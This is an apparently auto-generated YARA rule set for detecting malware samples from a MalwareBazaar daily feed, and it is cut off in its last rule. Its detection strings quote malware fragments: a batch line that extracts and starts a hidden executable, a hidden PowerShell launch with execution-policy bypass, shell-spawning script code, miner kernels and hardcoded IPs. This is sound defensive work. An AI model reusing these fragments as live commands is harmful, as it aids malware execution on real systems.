/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-03
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_0824e07cbc4c5e599c9c74cf38731a59e6e72e09a0d21c0f9bbdb964087255f3 {
   meta:
      description = "evidences - file 0824e07cbc4c5e599c9c74cf38731a59e6e72e09a0d21c0f9bbdb964087255f3.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "0824e07cbc4c5e599c9c74cf38731a59e6e72e09a0d21c0f9bbdb964087255f3"
   strings:
      $s1 = "rmabcgt" fullword ascii
      $s2 = "23N.XLm" fullword ascii
      $s3 = "XyruN?" fullword ascii
      $s4 = "u:\\,&h" fullword ascii
      $s5 = "ORDER NO.520215485.img" fullword ascii
      $s6 = "# S9gq" fullword ascii
      $s7 = "+ |xl&" fullword ascii
      $s8 = "9MZC* " fullword ascii
      $s9 = "+ R/p+W&SV" fullword ascii
      $s10 = "%EQJ%d" fullword ascii
      $s11 = "z6C -B" fullword ascii
      $s12 = "( -/0a" fullword ascii
      $s13 = "pG- q5" fullword ascii
      $s14 = "VUOMSj3" fullword ascii
      $s15 = "2.J+ ^$*4" fullword ascii
      $s16 = "^fBN+ w#;" fullword ascii
      $s17 = "rcTeBOO" fullword ascii
      $s18 = "Sugwc=+" fullword ascii
      $s19 = "vEGQ4M+wsF" fullword ascii
      $s20 = "EkeC;\"" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      8 of them
}

rule sig_29ff469e33d40be4a1e8f457c0551fd1ebe5d0b96c5b088d7298c0ef9c2bfee6 {
   meta:
      description = "evidences - file 29ff469e33d40be4a1e8f457c0551fd1ebe5d0b96c5b088d7298c0ef9c2bfee6.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "29ff469e33d40be4a1e8f457c0551fd1ebe5d0b96c5b088d7298c0ef9c2bfee6"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "Keegr.Execution" fullword ascii
      $s3 = "Keegr.exe" fullword wide
      $s4 = "m_LoggerProxy" fullword ascii
      $s5 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s6 = "userCommand" fullword ascii
      $s7 = "istemplate" fullword ascii
      $s8 = "TraverseOperationalVisitor" fullword ascii
      $s9 = "GenerateSortedEncryptor" fullword ascii
      $s10 = "watcherLogger" fullword ascii
      $s11 = "KEEGR.EXE;1" fullword ascii
      $s12 = "UseConfigurableDecryptor" fullword ascii
      $s13 = "Keegr.exe;1" fullword wide
      $s14 = "UserSpec" fullword ascii
      $s15 = "TraverseReadableVisitor" fullword ascii
      $s16 = "TraverseCombinedVisitor" fullword ascii
      $s17 = "ParserCommand" fullword ascii
      $s18 = "get_ErrorProvider" fullword ascii
      $s19 = "UseOperationalConfiguration" fullword ascii
      $s20 = "m_DicTemplate" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 4000KB and
      8 of them
}

rule sig_0bf6022a5b7a615cbacddd3f0d4844d84fcba68c5a3185cae59f46930bc43fed {
   meta:
      description = "evidences - file 0bf6022a5b7a615cbacddd3f0d4844d84fcba68c5a3185cae59f46930bc43fed.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "0bf6022a5b7a615cbacddd3f0d4844d84fcba68c5a3185cae59f46930bc43fed"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "get_loader_name_from_dll" fullword ascii
      $s7 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s8 = "Update.dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "qgethostname" fullword ascii
      $s14 = "process_config_directive" fullword ascii
      $s15 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s16 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s17 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "qregexec" fullword ascii
      $s20 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_3d306f1ed48daae3c9bc67cd068aa5821191dc4b301431c7badb63fea9b36230 {
   meta:
      description = "evidences - file 3d306f1ed48daae3c9bc67cd068aa5821191dc4b301431c7badb63fea9b36230.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "3d306f1ed48daae3c9bc67cd068aa5821191dc4b301431c7badb63fea9b36230"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "get_loader_name_from_dll" fullword ascii
      $s7 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s8 = "Update.dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "qgethostname" fullword ascii
      $s14 = "process_config_directive" fullword ascii
      $s15 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s16 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s17 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "qregexec" fullword ascii
      $s20 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 23000KB and
      1 of ($x*) and 4 of them
}

rule sig_591ff1092ef559ef1247093d6aa0d829c344c863a09d57f5d01d882f03630d81 {
   meta:
      description = "evidences - file 591ff1092ef559ef1247093d6aa0d829c344c863a09d57f5d01d882f03630d81.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "591ff1092ef559ef1247093d6aa0d829c344c863a09d57f5d01d882f03630d81"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "get_loader_name_from_dll" fullword ascii
      $s7 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s8 = "Update.dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "qgethostname" fullword ascii
      $s14 = "process_config_directive" fullword ascii
      $s15 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s16 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s17 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "qregexec" fullword ascii
      $s20 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 23000KB and
      1 of ($x*) and 4 of them
}

rule cea9ff02e6556a05a92102e33e516bf937bc47f431c0771912c34c7e4d8653d5 {
   meta:
      description = "evidences - file cea9ff02e6556a05a92102e33e516bf937bc47f431c0771912c34c7e4d8653d5.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "cea9ff02e6556a05a92102e33e516bf937bc47f431c0771912c34c7e4d8653d5"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x3 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x4 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s5 = "ReachFramework.resources.dll" fullword wide
      $s6 = "get_loader_name_from_dll" fullword ascii
      $s7 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s8 = "Update.dll" fullword ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s12 = "get_loader_name" fullword ascii
      $s13 = "qgethostname" fullword ascii
      $s14 = "process_config_directive" fullword ascii
      $s15 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s16 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s17 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s18 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s19 = "qregexec" fullword ascii
      $s20 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 23000KB and
      1 of ($x*) and 4 of them
}

rule sig_6c76b0654fd88351436c641c0c81abb399a8f37702e9f8375d71283a75274f6b {
   meta:
      description = "evidences - file 6c76b0654fd88351436c641c0c81abb399a8f37702e9f8375d71283a75274f6b.bat"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "6c76b0654fd88351436c641c0c81abb399a8f37702e9f8375d71283a75274f6b"
   strings:
      $s1 = "cls && extrac32 /y \"%~f0\" \"%tmp%\\x.exe\" && start \"\" \"%tmp%\\x.exe\"" fullword ascii
      $s2 = "EXE Files|*.exe" fullword ascii
      $s3 = ";#http://ns.adobe.com/xap/1.0/" fullword ascii
      $s4 = "clWebDarkMagenta" fullword ascii
      $s5 = "Stream write error\"Unable to find a Table of Contents" fullword wide
      $s6 = "            xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\">" fullword ascii
      $s7 = "            xmlns:xapMM=\"http://ns.adobe.com/xap/1.0/mm/\"" fullword ascii
      $s8 = "            xmlns:xap=\"http://ns.adobe.com/xap/1.0/\">" fullword ascii
      $s9 = "!EProt - Open File" fullword ascii
      $s10 = "            xmlns:exif=\"http://ns.adobe.com/exif/1.0/\">" fullword ascii
      $s11 = "            xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/ResourceRef#\">" fullword ascii
      $s12 = "            xmlns:tiff=\"http://ns.adobe.com/tiff/1.0/\">" fullword ascii
      $s13 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii
      $s14 = "TCommonDialog,fC" fullword ascii
      $s15 = "OnDrawItemPPA" fullword ascii
      $s16 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii
      $s17 = "OnMeasureItemPPA" fullword ascii
      $s18 = "EComponentErrordUA" fullword ascii
      $s19 = "eplogo" fullword wide
      $s20 = "Write$Error creating variant or safe array!'%s' is not a valid integer value" fullword wide
   condition:
      uint16(0) == 0x534d and filesize < 4000KB and
      8 of them
}

rule sig_4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6 {
   meta:
      description = "evidences - file 4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "4ecec027e6d792ca054809bab915d600c9646c6a11e5884ab06eddeb9937d6f6"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii
      $x2 = "var _tmp = 'Detected OS: ' + require('os').Name; try{_tmp += (' - ' + require('os').arch());}catch(x){}console.log(_tmp);if(proc" ascii
      $x3 = "ess.platform=='win32'){ _tmp=require('win-authenticode-opus')(process.execPath); if(_tmp!=null && _tmp.url!=null){ _tmp=require(" ascii
      $x4 = "console.log(getSHA384FileHash(process.execPath).toString('hex'));process.exit();" fullword ascii
      $x5 = "console.log(getSHA384FileHash(process.execPath).toString('hex').substring(0,16));process.exit();" fullword ascii
      $x6 = "ScriptContainer.Create(): Error spawning child process, using [%s]" fullword ascii
      $x7 = "eJycu1mPtFCc3nc/0nyHV3PjxIyHYodYlnLY950q4MZih6LYdz59eGfGjq1YkZLuVnVXcQrOOf/l+T10N/wf//EfuGG85qaq1z/oC0X+0/OA/lH6tfj94YZ5HOZkbYb+" ascii
      $x8 = "translation={\"en\":{\"agent\":\"Agent\",\"agentVersion\":\"New Version\",\"group\":\"Device Group\",\"url\":\"Server URL\",\"me" ascii
      $x9 = "process.coreDumpLocation = process.platform=='win32'?(process.execPath.replace('.exe', '.dmp')):(process.execPath + '.dmp');" fullword ascii
      $x10 = "Q9henRPsvGgh/3aCMr2c4FotEDgVLAuiUg4KiwemFhgWX1850C4exOLJnHhDmDJQfq/L9ySxarBbTOsB3fC9FhVgXSV6TcTdfoh2S9yv5s+8S5XZVhqzr1nmOB0Ez+Ma" ascii
      $x11 = "var _tmp=require('child_process').execFile('/bin/sh', ['sh']);_tmp.stdout.on('data', function (){});_tmp.stdin.write('loginctl k" ascii
      $x12 = "XjIxk7rxFUfHalEkwFEoOCoCbWC3+VDPG2Wc4xvHdqFw5JacenmA+NoEEaehVikJ8GiJbTQDe6GEs6Fo++SLr3BfEHQZ4npk9OsVaR6sePSpCGaJCuLqNX3aW+U+byZV" ascii
      $x13 = "child.stdin.write('lsof -p ' + (pid ? pid : process.pid) + '\\nexit\\n');" fullword ascii
      $x14 = "\"},\"it\":{\"agent\":\"Agente\",\"group\":\"Gruppo di dispositivi\",\"url\":\"URL del server\",\"meshName\":\"Nome del gruppo\"" ascii
      $x15 = "eJzsu9my60hyLfheZvUPx/Qi6UIqzANbV2aNeZ4HAngpAzETMwgQANv63zuYmVWVWaUr6XZbv9U2O4fcDI/Jw335WkRs+H/8/nf8NF9rWzfbDwxBb/+KIRj2Qx23sv/B" ascii
      $x16 = "NSTALLEERD\",\"ACTIEF\",\"NIET ACTIEF\"],\"statusDescription\":\"Huidige agent status\",\"agentVersion\":\"Nieuwe versie\",\"ele" ascii
      $x17 = "%s\\system32\\cmd.exe" fullword wide
      $x18 = "console.log('Error Initializing script from Zip file');process._exit();" fullword ascii
      $x19 = "process.versions.commitHash" fullword ascii
      $s20 = "A\"],\"statusDescription\":\"Obecny Status Agenta\",\"agentVersion\":\"Nowa Wersja\",\"elevation\":\"Do zainstalowania/odinstalo" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*)
}

rule sig_73f03b369e9df60c2dc97baefcdc4ba920da3a2126c873a4654e1a83510d3b87 {
   meta:
      description = "evidences - file 73f03b369e9df60c2dc97baefcdc4ba920da3a2126c873a4654e1a83510d3b87.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "73f03b369e9df60c2dc97baefcdc4ba920da3a2126c873a4654e1a83510d3b87"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii
      $s2 = "32~.dll" fullword ascii
      $s3 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii
      $s4 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii
      $s5 = "RegOQP.penKeyEx" fullword ascii
      $s6 = "http://ocsp.digicert.com0\\" fullword ascii
      $s7 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0=" fullword ascii
      $s8 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii
      $s9 = "http://www.digicert.com/CPS0" fullword ascii
      $s10 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii
      $s11 = "IFYHOST" fullword ascii
      $s12 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii
      $s13 = "XXXNNNNXXXXNNNNXXXXNNNNXXXXNNNNXYYYNNNNYYYYNNNNYYYYNNNNYYYYNNNNYYYZNNNNZZZZNNNNZZZZNNNNZZZZNNNNZZZZ" fullword ascii
      $s14 = "geTa 2w" fullword ascii
      $s15 = "M; MSIE 9*" fullword ascii
      $s16 = "** RxXq" fullword ascii
      $s17 = "* 1%\\$#" fullword ascii
      $s18 = "resentt" fullword ascii
      $s19 = "ferrrrdcba" fullword ascii
      $s20 = "mnopvrr" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec636844fb84 {
   meta:
      description = "evidences - file 810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec636844fb84.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "810838fe05bf0fac2ca9659efa6d2d5bb6f0e324ce9330ad1ba6ec636844fb84"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s2 = "__kernel void find_shares(__global const uint64_t* hashes,uint64_t target,uint32_t start_nonce,__global uint32_t* shares)" fullword ascii
      $s3 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s4 = "hwloc/x86: Could not read dumped cpuid file %s, ignoring cpuiddump." fullword ascii
      $s5 = "void blake2b_512_process_single_block(ulong *h,const ulong* m,uint blockTemplateSize)" fullword ascii
      $s6 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s7 = "%PROGRAMFILES%\\NVIDIA Corporation\\NVSMI\\nvml.dll" fullword ascii
      $s8 = "blake2b_512_process_double_block_variable(hash,m,p,blockTemplateSize,64);" fullword ascii
      $s9 = "blake2b_512_process_single_block(hash,m,blockTemplateSize);" fullword ascii
      $s10 = "      --opencl-loader=PATH      path to OpenCL-ICD-Loader (OpenCL.dll or libOpenCL.so)" fullword ascii
      $s11 = "      --cuda-loader=PATH        path to CUDA plugin (xmrig-cuda.dll or libxmrig-cuda.so)" fullword ascii
      $s12 = "nicehash.com" fullword ascii
      $s13 = "get_payload_public_key" fullword ascii
      $s14 = "get_payload_private_key" fullword ascii
      $s15 = "__kernel void blake2b_initial_hash_double(__global void *out,__global const void* blockTemplate,uint blockTemplateSize,uint star" ascii
      $s16 = ".?AVExecuteVmKernel@xmrig@@" fullword ascii
      $s17 = "__kernel void progpow_search(__global dag_t const* g_dag,__global uint* job_blob,ulong target,uint hack_false,volatile __global " ascii
      $s18 = "* hwloc %s received invalid information from the operating system." fullword ascii
      $s19 = "__kernel void progpow_search(__global dag_t const* g_dag,__global uint* job_blob,ulong target,uint hack_false,volatile __global " ascii
      $s20 = "__kernel void execute_vm(__global void* vm_states,__global void* rounding,__global void* scratchpads,__global const void* datase" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule sig_0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9 {
   meta:
      description = "evidences - file 0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "0e2aeb9b2f0e0ba891cda89feeb22e15b6c1ffae6f8ada5aab9ef585972440b9"
   strings:
      $s1 = "dumping '%s' (%u bytes)" fullword ascii
      $s2 = "Buffering of future message of size %zu would exceed the compile-time limit %zu (already %zu bytes buffered) -- attempt to make " ascii
      $s3 = "Buffering of future message of size %zu would exceed the compile-time limit %zu (already %zu bytes buffered) -- attempt to make " ascii
      $s4 = "server version out of bounds -  min: [%d:%d], server: [%d:%d], max: [%d:%d]" fullword ascii
      $s5 = "mbedtls_ssl_get_max_out_record_payload" fullword ascii
      $s6 = "Buffering of future message of size %zu would exceed the compile-time limit %zu (already %zu bytes buffered) -- ignore" fullword ascii
      $s7 = "Injecting buffered CCS message" fullword ascii
      $s8 = "ssl_get_remaining_payload_in_datagram" fullword ascii
      $s9 = "Buffering of future epoch record of size %zu would exceed the compile-time limit %zu (already %zu bytes buffered) -- ignore" fullword ascii
      $s10 = "server hello, chosen version: [%d:%d]" fullword ascii
      $s11 = "%s: '%s' is not an ELF executable for 386" fullword ascii
      $s12 = "client hello v3, protocol version: [%d:%d]" fullword ascii
      $s13 = "client hello, max version: [%d:%d]" fullword ascii
      $s14 = "input payload after decrypt" fullword ascii
      $s15 = "Fragment header mismatch - ignore" fullword ascii
      $s16 = "Reassembly of next message of size %zu (%zu with bitmap) would exceed the compile-time limit %zu (already %zu bytes buffered) --" ascii
      $s17 = "Unable to process RELA relocs" fullword ascii
      $s18 = "client hello v3, signature_algorithm ext: hash alg %u not supported" fullword ascii
      $s19 = "no hash algorithm for signature algorithm %u - should not happen" fullword ascii
      $s20 = "ssl_check_pending: record held back for processing" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule dabb17eca3efee983ed6a96071f94346643745b2cadcb35872f2d534c1a564c5 {
   meta:
      description = "evidences - file dabb17eca3efee983ed6a96071f94346643745b2cadcb35872f2d534c1a564c5.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "dabb17eca3efee983ed6a96071f94346643745b2cadcb35872f2d534c1a564c5"
   strings:
      $s1 = "ash|login|wget|curl|tftp|ntpdate|ftp" fullword ascii
      $s2 = "/bin/login" fullword ascii
      $s3 = "/home/process" fullword ascii
      $s4 = "/usr/libexec/" fullword ascii
      $s5 = "Remote I/O error" fullword ascii
      $s6 = "/system/system/bin/" fullword ascii
      $s7 = "/usr/lib/systemd" fullword ascii
      $s8 = "/proc/%s/status" fullword ascii
      $s9 = "/lib/systemd/" fullword ascii
      $s10 = "35.195.181.0" fullword ascii
      $s11 = "35.195.23.0" fullword ascii
      $s12 = "35.195.18.0" fullword ascii
      $s13 = "35.195.152.0" fullword ascii
      $s14 = "35.195.63.0" fullword ascii
      $s15 = "35.195.68.0" fullword ascii
      $s16 = "35.195.204.0" fullword ascii
      $s17 = "35.195.254.0" fullword ascii
      $s18 = "35.195.91.0" fullword ascii
      $s19 = "35.195.49.0" fullword ascii
      $s20 = "35.195.171.0" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_1558f47d2a6e8a59cb63d39ea7c622ce7e59cde95912a9db73524d2862baeb85 {
   meta:
      description = "evidences - file 1558f47d2a6e8a59cb63d39ea7c622ce7e59cde95912a9db73524d2862baeb85.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "1558f47d2a6e8a59cb63d39ea7c622ce7e59cde95912a9db73524d2862baeb85"
   strings:
      $s1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" fullword ascii
      $s2 = "GET / HTTP/1.1" fullword ascii
      $s3 = "handle_command" fullword ascii
      $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017" fullword ascii
      $s5 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword ascii
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" fullword ascii
      $s9 = "daemonize" fullword ascii
      $s10 = "_IO_stdin_used" fullword ascii
      $s11 = ".note.ABI-tag" fullword ascii
      $s12 = "threads.0" fullword ascii
      $s13 = "frame_dummy" fullword ascii
      $s14 = ".note.gnu.build-id" fullword ascii
      $s15 = "completed.1" fullword ascii
      $s16 = "http_attack" fullword ascii
      $s17 = "pthread_create@GLIBC_2.34" fullword ascii
      $s18 = "__stack_chk_fail@GLIBC_2.4" fullword ascii
      $s19 = "__FRAME_END__" fullword ascii
      $s20 = "89.250.72.36" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 50KB and
      8 of them
}

rule sig_140c357f592d4e1614584f1c753e1a9791bb27693d07fde44fe00d00da0923d4 {
   meta:
      description = "evidences - file 140c357f592d4e1614584f1c753e1a9791bb27693d07fde44fe00d00da0923d4.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-03"
      hash1 = "140c357f592d4e1614584f1c753e1a9791bb27693d07fde44fe00d00da0923d4"
   strings:
      $x1 = "            Start-Process -FilePath $p -WindowStyle Hidden -ArgumentList \"-ExecutionPolicy Bypass\"" fullword ascii
      $s2 = "    [DllImport(\"user32.dll\")]" fullword ascii
      $s3 = "function d([string]$s){[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}" fullword ascii
